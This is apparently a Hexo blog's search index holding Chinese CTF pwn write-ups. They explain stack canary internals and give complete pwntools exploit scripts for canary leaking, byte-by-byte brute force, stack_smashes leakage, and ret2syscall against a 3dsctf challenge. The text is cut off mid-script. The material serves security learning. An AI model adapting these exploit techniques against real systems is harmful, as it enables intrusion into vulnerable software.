<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/07/18/hello-world/"/>
    <url>/2024/07/18/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p><img src="/2024/07/18/hello-world/image-20240718185738048.png" alt="image-20240718185738048"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>绕过保护之Canary</title>
    <link href="/2024/07/18/%E7%BB%95%E8%BF%87%E4%BF%9D%E6%8A%A4%E4%B9%8BCanary/"/>
    <url>/2024/07/18/%E7%BB%95%E8%BF%87%E4%BF%9D%E6%8A%A4%E4%B9%8BCanary/</url>
    
    <content type="html"><![CDATA[<h1 id="初识Canary"><a href="#初识Canary" class="headerlink" title="初识Canary"></a>初识Canary</h1><p><strong>关于canary说白了就是一个防止栈溢出的手段，一般情况下是在栈底前边设置一个值，在进程结束时，对比这个值有没有被篡改，如果篡改就退出。具体汇编如下</strong><br><strong>函数开始前在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 rbp-0x8 的位置(32位ebp-0x4。但是这个位置不是绝对的，可以通过ida分析)。 这个操作即为向栈中插入 Canary 值</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mov    rax, qword ptr fs:[0x28]<br>mov    qword ptr [rbp - 8], rax<br></code></pre></td></tr></table></figure><p><strong>函数结束时，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mov    rdx,QWORD PTR [rbp-0x8]<br>xor    rdx,QWORD PTR fs:0x28<br>je     0x4005d7 &lt;main+65&gt;<br>call   0x400460 &lt;__stack_chk_fail@plt&gt;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/hello-world/3340174-20240711205256772-1243982130.png"></p><p><strong>如果 Canary 已经被非法修改，此时程序流程会走到 __stack_chk_fail。__stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，这个函数不同的libc会不同（从glibc开始 2.27后稍有不同）定义如下</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">eglibc<span class="hljs-number">-2.19</span>/debug/stack_chk_fail.c<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>在没有开启FULL RELRO保护时，我们可以通过劫持GOT表，然后触发Canary检测报错，这时就会进入劫持的地址。另一种是利用fortify_fail函数打印关键信息</strong><br><strong>关于Canary的储存地址，对于Liunx来说，fs寄存器实际指向的是当前进程的TLS结构，fs：0x28指向的正式stack_guard。如果溢出条件合适，我们完全可以覆盖TLS中保存的Canary值</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">void</span> *tcb;        <span class="hljs-comment">/* Pointer to the TCB.  Not necessarily the</span><br><span class="hljs-comment">                       thread descriptor used by libpthread.  */</span><br>  <span class="hljs-type">dtv_t</span> *dtv;<br>  <span class="hljs-type">void</span> *self;       <span class="hljs-comment">/* Pointer to the thread descriptor.  */</span><br>  <span class="hljs-type">int</span> multiple_threads;<br>  <span class="hljs-type">uintptr_t</span> sysinfo;<br>  <span class="hljs-type">uintptr_t</span> stack_guard;<br>  ...<br>&#125; <span class="hljs-type">tcbhead_t</span>;<br></code></pre></td></tr></table></figure><p><strong>这个值由ssecurity_init函数来初始化</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">security_init</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br>  <span class="hljs-comment">// glibc直接使用了_dl_random的值并没有给赋值</span><br>  <span class="hljs-comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span><br><br>  <span class="hljs-comment">//将_dl_random的最后一个字节设置为0x0</span><br>  <span class="hljs-type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);<br><br>  <span class="hljs-comment">// 设置Canary的值到TLS中</span><br>  THREAD_SET_STACK_GUARD (stack_chk_guard);<br><br>  _dl_random = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span><br><span class="hljs-meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></code></pre></td></tr></table></figure><p><strong>Canary的最后一个字节呗设置为0，防止类似与printf(“%s” , &amp;buf)，形式的函数不小心打印出来，所以我们可以把这个0给覆盖，用打印函数来覆盖，这样就泄露了Canary的值</strong></p><h1 id="Canary保护机制总结"><a href="#Canary保护机制总结" class="headerlink" title="Canary保护机制总结"></a>Canary保护机制总结</h1><ol><li><strong>_dl_random由Kernel写入</strong></li><li><strong>security_init 函数将_dl_random 的最后一个字节设置为0，防止 printf(“%s”)这类打印函数不小心泄露 Canary。</strong></li><li><strong>security_init 函数将 Canary 值设置到 TLS 中。</strong></li><li><strong>在函数开始时，会取出TLS中的Canary值放在ebp-4h(64位系统为rbp-8h)<br>中，即防止通过栈溢出修改 ebp 和返回地址。</strong></li><li><strong>在函数结束时，会取出ebp-4h(64位系统为rbp-8h)的值，并与 TLS 中的 Canar值进行异或，判断是否为0。若结果为0，则检查通过;若结果不为0，则检查不通过，进人stack_chk_fail 函数</strong></li></ol><h2 id="Canary保护机制主要有两个漏洞"><a href="#Canary保护机制主要有两个漏洞" class="headerlink" title="Canary保护机制主要有两个漏洞"></a>Canary保护机制主要有两个漏洞</h2><ul><li><strong>stack_chk_fai1函数会有信息输出，如果我们能够控制 libc_argv[0]，就能够通过stack_chk fail函数泄露出我们想要的信息，这个技术被称为 stacksmashes(glibc 2.27 和 2.27之后的版本会有一些变化)。</strong></li><li>如果我们有一个很长的栈溢出，那么可以直接溢出TLS 中的 a1_random 的值，因此可以绕过 Canary 保护。当然，这里可能还需要一个多线程的条件，可以在后续例<br>题中看到。</li></ul><h2 id="对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点："><a href="#对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点：" class="headerlink" title="对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点："></a>对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点：</h2><ol><li><strong>利用泄露函数泄露出 Canary 的值，再进行利用。</strong></li><li><strong>爆破得到 Canary 的值。</strong></li><li><strong>stack_chk fai1 函数泄露关键信息。</strong></li><li><strong>修改 TLS 中的 stack quard 值。</strong></li></ol><h1 id="泄露Canary值"><a href="#泄露Canary值" class="headerlink" title="泄露Canary值"></a>泄露Canary值</h1><p><strong><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/leak_canary">附件下载</a></strong><br><img src="/2024/07/18/hello-world/3340174-20240711210624943-2102099079.png"><br><strong>注意点Canary值距离ebp为0xc，然后通过栈溢出覆盖最后一位0，通过打印函数打印出来cancary</strong></p><ol><li><strong>第一种是用栈溢出漏洞</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./leak_canary&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br>target = <span class="hljs-number">0x080485CC</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + <span class="hljs-string">b&#x27;b&#x27;</span><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span>)<br>canary_addr = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;b&#x27;</span>)<br>success(<span class="hljs-built_in">hex</span>(canary_addr))<br>payload2 = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x100</span> + p32(canary_addr)<br>payload2 += p32(<span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>payload2 += p32(target)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure></li><li>第二种是利用格式化字符串<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./leak_canary&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br>target = <span class="hljs-number">0x080485CC</span><br>p1 = <span class="hljs-string">&#x27;%&#123;offset&#125;$p\n&#x27;</span>.<span class="hljs-built_in">format</span>(offset = <span class="hljs-number">71</span>)<br><br>p.send(p1)<br>canary_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span> , drop=<span class="hljs-literal">True</span>) , <span class="hljs-number">16</span>)<br><br>success(<span class="hljs-built_in">hex</span>(canary_addr))<br>p2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p32(canary_addr)<br>p2 += <span class="hljs-number">0xc</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>p2 += p32(target)<br><br>p.sendline(p2)<br>p.interactive()<br></code></pre></td></tr></table></figure></li></ol><h1 id="逐字节爆破Canary"><a href="#逐字节爆破Canary" class="headerlink" title="逐字节爆破Canary"></a>逐字节爆破Canary</h1><p><strong><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/one_by_one_bruteforce">附件下载</a></strong><br><strong>这种方法局限性比较大，必须有fork函数开启子进程。因为fork函数会直接拷贝父进程内存，所以创建的子进程canary都是相同的</strong><br><img src="/2024/07/18/hello-world/3340174-20240711211553329-1811041622.png"><br><strong>我们一直fork开启子进程，一个一个字节的爆破</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./one_by_one_bruteforce&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruteforce1bit</span>() :<br>  <span class="hljs-keyword">global</span> known<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    p1 = <span class="hljs-number">0x108</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>    p1 += known<br>    p1 += <span class="hljs-built_in">bytes</span>([i])<br>    p.sendafter(<span class="hljs-string">&#x27;one_by_one_bruteforce\n&#x27;</span>,p1)<br>    <span class="hljs-keyword">try</span> :<br>      info = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>      <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;*** stack smashing detected ***&quot;</span> <span class="hljs-keyword">in</span> info :<br>        p.send(<span class="hljs-string">&#x27;n\n&#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>      <span class="hljs-keyword">else</span> :<br>        known += <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span>:<br>        log.info(<span class="hljs-string">&#x27;wrong&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>      <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruteforce_canary</span>():<br>  <span class="hljs-keyword">global</span> known<br>  known += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    bruteforce1bit()<br>    <span class="hljs-keyword">if</span> i != <span class="hljs-number">6</span> :<br>      p.send(<span class="hljs-string">b&#x27;n\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span> :<br>      p.send(<span class="hljs-string">b&#x27;y\n&#x27;</span>)<br><br>target = <span class="hljs-number">0x000000000040083E</span><br>known = <span class="hljs-string">b&quot;&quot;</span><br>bruteforce_canary()<br>canary = u64(known)  <span class="hljs-comment"># Ensure known is 8 bytes</span><br>log.success(<span class="hljs-string">&quot;canary: &quot;</span> + <span class="hljs-built_in">hex</span>(canary))<br>p2 = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x108</span> + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(target)<br>p.sendafter(<span class="hljs-string">b&quot;go\n&quot;</span>, p2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>| 这两个理解起来都很简单，没有什么难点，看着exp很容易理解</p><h1 id="stack-smashes"><a href="#stack-smashes" class="headerlink" title="stack_smashes"></a>stack_smashes</h1><p><strong><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/stack_smashes">附件下载</a></strong></p><p><strong>前边已经简绍了，_stack_chk_fail函数会将__libc_agrc[0]的信息打印出来，所以我们可以改变__libc_agrc[0]的地址为我们想要信息的值，那么就能得到相应数据了</strong><br><img src="/2024/07/18/hello-world/3340174-20240711212205701-952311395.png"><br><strong>首先简绍一下什么是__libc_agrc[0]</strong></p><p><strong>main(int argc , char ,*argv[ ])</strong></p><ol><li><strong>argc为整数</strong></li><li><strong>argv为指针的指针（可理解为：char **argv or: char *argv[] or: char argv[][] ，argv是一个指针数组)</strong><br><strong>注：main()括号内是固定的写法。</strong></li><li><strong>下面给出一个例子来理解这两个参数的用法：</strong><br>**　假设程序的名称为prog，**<br><strong>当只输入prog，则由操作系统传来的参数为：</strong><br><strong>argc&#x3D;1,表示只有一程序名称。</strong><br><strong>argc只有一个元素，argv[0]指向输入的程序路径及名称：.&#x2F;prog</strong><br><strong>当输入prog para_1，有一个参数，则由操作系统传来的参数为：</strong><br><strong>argc&#x3D;2，表示除了程序名外还有一个参数。</strong><br><strong>argv[0]指向输入的程序路径及名称。</strong><br><strong>argv[1]指向参数para_1字符串。</strong><br><strong>当输入prog para_1 para_2 有2个参数，则由操作系统传来的参数为：</strong><br><strong>argc&#x3D;3，表示除了程序名外还有2个参数。</strong><br><strong>argv[0]指向输入的程序路径及名称。</strong><br><strong>argv[1]指向参数para_1字符串。</strong><br><strong>argv[2]指向参数para_2字符串。</strong></li><li><strong>void main( int argc, char *argv[] )</strong><br><strong>char *argv[] : argv 是一个指针数组，他的元素个数是argc，存放的是指向每一个参数的指针</strong></li></ol><p><strong>我们本题需要找__libc_agrc[0]和输入的偏移</strong><br><strong>下断点直接到输入函数</strong><br><img src="/2024/07/18/hello-world/3340174-20240711213242742-1322553195.png"><br><strong>第二个参数为输入地址（具体第几个参数，根据函数本身决定）</strong><br><strong>下断点到main</strong><br><img src="/2024/07/18/hello-world/3340174-20240711213804728-1208603033.png"><br><strong>__libc_argv[0]指向的是文件路径</strong><br><img src="/2024/07/18/hello-world/3340174-20240711214015987-1913848852.png"><br><strong>直接算出偏移</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#脚本也是非常easy</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./stack_smashes&quot;</span>)<br>gdb.attach(p,<span class="hljs-string">&quot;b *0x000000000040087A&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>flag_addr = <span class="hljs-number">0x0000000000601090</span><br>p2 = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x218</span> + p64(flag_addr)<br>p.sendafter(<span class="hljs-string">&quot;stack_smashes\n&quot;</span>,p2)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>not_the_same_3dsctf_2016</title>
    <link href="/2024/07/18/not-the-same-3dsctf-2016/"/>
    <url>/2024/07/18/not-the-same-3dsctf-2016/</url>
    
    <content type="html"><![CDATA[<h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p><strong>查看保护就不说了</strong><br><img src="/2024/07/18/hello-world/-3dsctf-2016/3340174-20240709150106100-1584911977.png"></p><p><strong>IDA反编译发现为静态编译，不用找libc了这点节省不少功夫。打开main函数，发现栈溢出漏洞</strong><br><img src="/2024/07/18/hello-world/-3dsctf-2016/3340174-20240709150247577-737536292.png"><br><strong>偏移为45，这个是根据gdb的cyclic算出来的</strong><br><strong>发现后门函数get_secret，功能是把flag读取赋值给fl4g</strong><br><img src="/2024/07/18/hello-world/-3dsctf-2016/3340174-20240709150422799-300419962.png"><br><strong>初步思路为通过栈溢出，调用get_secret，再通过write函数读取fl4g</strong></p><h2 id="方法一-通过栈溢出调用后门函数"><a href="#方法一-通过栈溢出调用后门函数" class="headerlink" title="方法一 通过栈溢出调用后门函数"></a>方法一 通过栈溢出调用后门函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br>write_addr = <span class="hljs-number">0x806E270</span><br>flag_addr = <span class="hljs-number">0x080ECA2D</span><br>target = <span class="hljs-number">0x080489A0</span><br>exit_addr = <span class="hljs-number">0x0804E660</span><br><br>payload = <span class="hljs-number">45</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(target)<br>payload += p32(elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(exit_addr)<br>payload += p32(<span class="hljs-number">1</span>) + p32(flag_addr) + p32(<span class="hljs-number">42</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>我们前面分析这个是静态编译，我们可以直接ret2syscall，通过设置寄存器的值，直接获得shell</strong></p><h2 id="方法二-ret2syscall"><a href="#方法二-ret2syscall" class="headerlink" title="方法二 ret2syscall"></a>方法二 ret2syscall</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br><span class="hljs-comment">#gdb.attach(p , &#x27;b * 0x080489EA&#x27;)</span><br><span class="hljs-comment">#0x08048b0b : pop eax ; ret</span><br>pop_eax = <span class="hljs-number">0x08048b0b</span><br><span class="hljs-comment">#0x0806fcc9 : pop ebx ; pop edx ; ret</span><br>pop_ebx_edx = <span class="hljs-number">0x0806fcc9</span><br><span class="hljs-comment">#0x0806fcf1 : pop ecx ; pop ebx ; ret</span><br>pop_ecx_ebx = <span class="hljs-number">0x0806fcf1</span><br><span class="hljs-comment">#0x0806d8a5 : int 0x80</span><br>int80_addr = <span class="hljs-number">0x0806d8a5</span><br>get_addr = <span class="hljs-number">0x0804F8D0</span><br>data_addr = <span class="hljs-number">0x080EBAD2</span><br>target = <span class="hljs-number">0x080489A0</span><br><span class="hljs-comment">#0x080481ad : pop ebx ; ret</span><br>pop1 = <span class="hljs-number">0x080481ad</span> <br>payload = <span class="hljs-number">45</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(get_addr) + p32(pop1) + p32(data_addr)<br>payload += p32(pop_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload += p32(pop_eax) + p32(<span 